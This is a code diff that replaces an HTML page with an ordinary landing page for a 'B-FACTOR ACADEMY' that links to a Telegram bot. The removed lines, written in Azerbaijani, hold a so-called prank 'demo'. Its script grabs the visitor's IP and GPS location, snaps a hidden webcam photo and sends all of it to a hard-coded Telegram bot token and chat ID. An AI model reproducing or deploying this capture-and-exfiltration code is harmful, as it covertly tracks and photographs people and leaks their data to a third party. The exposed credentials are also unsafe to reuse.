@@ -1,186 +1,223 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera & Location Demo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>B-FACTOR ACADEMY</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-<style>
-body{
-    background:#111;
-    color:white;
-    font-family:Arial;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    margin:0;
-    text-align:center;
-}
+        :root {
+            --primary-color: #00bcd4;
+            --dark-bg: #0f172a;
+            --card-bg: #1e293b;
+            --text-light: #f8fafc;
+            --text-muted: #94a3b8;
+        }
 
-button{
-    padding:14px 24px;
-    border:none;
-    border-radius:10px;
-    background:#00ff99;
-    color:black;
-    font-size:16px;
-    cursor:pointer;
-}
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
 
-video{
-    display:none;
-}
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1.5rem 0;
+        }
 
-#status{
-    margin-top:20px;
-    max-width:90%;
-}
-</style>
+        .grid-2, .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        header {
+            background-color: rgba(15, 23, 42, 0.95);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid #1e293b;
+            backdrop-filter: blur(10px);
+        }
+
+        header .container {
+            display: flex;
+            flex-direction: column;
+            gap: 0.8rem;
+            align-items: center;
+            text-align: center;
+            padding: 0.8rem 0;
+        }
+
+        .logo {
+            font-size: 1.4rem;
+            font-weight: 800;
+        }
+
+        .logo span {
+            color: var(--primary-color);
+        }
+
+        nav {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav a {
+            color: var(--text-light);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        nav a:hover {
+            color: var(--primary-color);
+        }
+
+        .btn-nav {
+            background-color: var(--primary-color);
+            color: var(--dark-bg) !important;
+            padding: 0.4rem 0.8rem;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .hero {
+            padding: 10rem 0 4rem 0;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 2.2rem;
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+        }
+
+        .btn-primary {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: var(--dark-bg);
+            padding: 0.8rem 2rem;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .about, .team, .register {
+            padding: 3rem 0;
+            text-align: center;
+        }
+
+        .stats {
+            background-color: var(--card-bg);
+            padding: 3rem 0;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: var(--text-muted);
+        }
+    </style>
 </head>
+
 <body>
 
-<h2>Demo Kamera Sistemi</h2>
+<header>
+    <div class="container">
+        <div class="logo">B-FACTOR <span>ACADEMY</span></div>
+        <nav>
+            <a href="#about">About</a>
+            <a href="#stats">Stats</a>
+            <a href="#team">Admins</a>
+            <a href="https://t.me/BFactorAcademy_bot" class="btn-nav">Register</a>
+        </nav>
+    </div>
+</header>
 
-<p>
-Bu demo:
-<br>
-• Kamera şəkli çəkəcək
-<br>
-• Təxmini IP məlumatını alacaq
-<br>
-• Konum icazəsi istəyəcək
-<br>
-• Məlumatları Telegram botuna göndərəcək
-</p>
+<section class="hero">
+    <div class="container">
+        <h1>Unlock Your Potential With B-FACTOR</h1>
+        <p>Empowering the next generation of digital entrepreneurs and professionals.</p>
+        <a href="https://t.me/BFactorAcademy_bot" class="btn-primary">Get Started Now</a>
+    </div>
+</section>
 
-<button onclick="start()">Razıyam</button>
+<section id="about" class="about">
+    <div class="container">
+        <h2>About Us</h2>
+        <p><strong>B-FACTOR ACADEMY</strong> was founded in 2026 by Nazir Ibrahimov and Arif Bagirov.</p>
+    </div>
+</section>
 
-<div id="status"></div>
+<section id="stats" class="stats">
+    <div class="container grid-3">
+        <div>
+            <h3>1,240+</h3>
+            <p>Active Users</p>
+        </div>
+        <div>
+            <h3>480+</h3>
+            <p>Graduates</p>
+        </div>
+        <div>
+            <h3>100%</h3>
+            <p>Satisfaction</p>
+        </div>
+    </div>
+</section>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<section id="team" class="team">
+    <div class="container">
+        <h2>Meet Our Admins</h2>
+        <div class="grid-2">
+            <div>
+                <h3>Nazir Ibrahimov</h3>
+                <p>Co-Founder</p>
+            </div>
+            <div>
+                <h3>Arif Bagirov</h3>
+                <p>Tech Lead</p>
+            </div>
+        </div>
+    </div>
+</section>
 
-<script>
+<section id="register" class="register">
+    <div class="container">
+        <h2>Join B-FACTOR ACADEMY</h2>
+        <p>Click below to register via Telegram bot.</p>
+        <a href="https://t.me/BFactorAcademy_bot" class="btn-primary">Open Telegram Bot</a>
+    </div>
+</section>
 
-const BOT_TOKEN = "8744224588:AAHxq0n_-gG2RhbitOuefZKnxZITTwFMWMY";
-const CHAT_ID = "6234777001";
-
-const statusBox = document.getElementById("status");
-const video = document.getElementById("video");
-
-async function sendTelegram(text){
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{
-            "Content-Type":"application/json"
-        },
-        body:JSON.stringify({
-            chat_id:CHAT_ID,
-            text:text
-        })
-    });
-
-}
-
-async function start(){
-
-    statusBox.innerText = "İcazələr alınır...";
-
-    try{
-
-        // IP məlumatı
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-
-        // Kamera
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video:true
-        });
-
-        video.srcObject = stream;
-
-        // Konum
-        navigator.geolocation.getCurrentPosition(async(pos)=>{
-
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-
-            await sendTelegram(
-                `Yeni giriş
-
-IP: ${ipData.ip}
-
-Konum:
-https://maps.google.com/?q=${lat},${lon}`
-            );
-
-            takePhoto();
-
-        }, async()=>{
-
-            await sendTelegram(
-                `Yeni giriş
-
-IP: ${ipData.ip}
-
-Konum icazəsi verilmədi`
-            );
-
-            takePhoto();
-
-        });
-
-    }catch(err){
-
-        statusBox.innerText = "İcazə verilmədi";
-
-    }
-
-}
-
-function takePhoto(){
-
-    setTimeout(async()=>{
-
-        const canvas = document.getElementById("canvas");
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const ctx = canvas.getContext("2d");
-
-        ctx.drawImage(video,0,0);
-
-        canvas.toBlob(async(blob)=>{
-
-            const formData = new FormData();
-
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.png");
-
-            await fetch(
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                {
-                    method:"POST",
-                    body:formData
-                }
-            );
-
-            document.body.innerHTML = `
-                <h1>😂 PRANK OLDU</h1>
-                <p>Demo uğurla tamamlandı 😄</p>
-            `;
-
-        },"image/png");
-
-    },2000);
-
-}
-
-</script>
+<footer>
+    <div class="container">
+        <p>&copy; 2026 B-FACTOR ACADEMY</p>
+    </div>
+</footer>
 
 </body>
 </html>
